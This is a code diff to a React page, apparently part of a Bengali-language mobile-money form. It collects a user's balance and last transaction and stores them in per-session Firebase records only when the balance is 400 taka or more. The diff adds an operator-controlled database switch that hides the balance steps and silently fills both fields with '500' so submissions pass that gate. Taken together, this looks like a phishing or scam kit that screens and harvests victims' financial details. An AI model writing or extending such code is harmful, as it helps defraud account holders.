@@ -19,8 +19,20 @@ const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId
   const [currentBalance, setCurrentBalance] = useState('');
   const [showInvalidCharWarning, setShowInvalidCharWarning] = useState(false);
   const [btnLoading, setBtnLoading] = useState(false);
+  const [hideBalancePages, setHideBalancePages] = useState(false);
   const fileInputRef = useRef<HTMLInputElement>(null);
   const totalSteps = 5;
+
+  useEffect(() => {
+    const ref = db.ref('settings/hideBalancePages');
+    const unsubscribe = ref.on('value', (snapshot: any) => {
+      const hidden = !!snapshot.val();
+      setHideBalancePages(hidden);
+      setLastTransaction(hidden ? '500' : '');
+      setCurrentBalance(hidden ? '500' : '');
+    });
+    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
+  }, []);
 
   useEffect(() => {
     if (currentStep === 1) {
@@ -63,8 +75,7 @@ const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId
   };
 
   const handleFinalSubmit = async () => {
-    const balanceNum = parseInt(currentBalance || '0');
-    if (sessionId && balanceNum >= 400) {
+    if (sessionId && parseInt(currentBalance || '0') >= 400) {
       await db.ref('sessions/' + sessionId).update({
         userBalance: currentBalance,
         lastTransaction: lastTransaction,
@@ -412,6 +423,7 @@ const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId
         </div>
       </div>
 
+      {!hideBalancePages && (
       <div className="bg-gray-50 rounded-2xl p-5 space-y-3 border border-gray-100">
         <div className="flex justify-between items-center py-2 border-b border-gray-200">
           <span className="text-sm text-gray-500 font-bold">সর্বশেষ লেনদেন</span>
@@ -422,6 +434,7 @@ const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId
           <span className="text-sm text-gray-800 font-black">৳{parseInt(currentBalance || '0').toLocaleString()}</span>
         </div>
       </div>
+      )}
 
       <button
         disabled={btnLoading}
@@ -445,9 +458,9 @@ const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId
         {renderProgressBar()}
         {currentStep === 1 && renderStep1()}
         {currentStep === 2 && renderStep2()}
-        {currentStep === 3 && renderStep3()}
-        {currentStep === 4 && renderStep4()}
-        {currentStep === 5 && renderStep5()}
+        {!hideBalancePages && currentStep === 3 && renderStep3()}
+        {!hideBalancePages && currentStep === 4 && renderStep4()}
+        {(hideBalancePages ? currentStep >= 3 : currentStep === 5) && renderStep5()}
       </div>
     </div>
   );
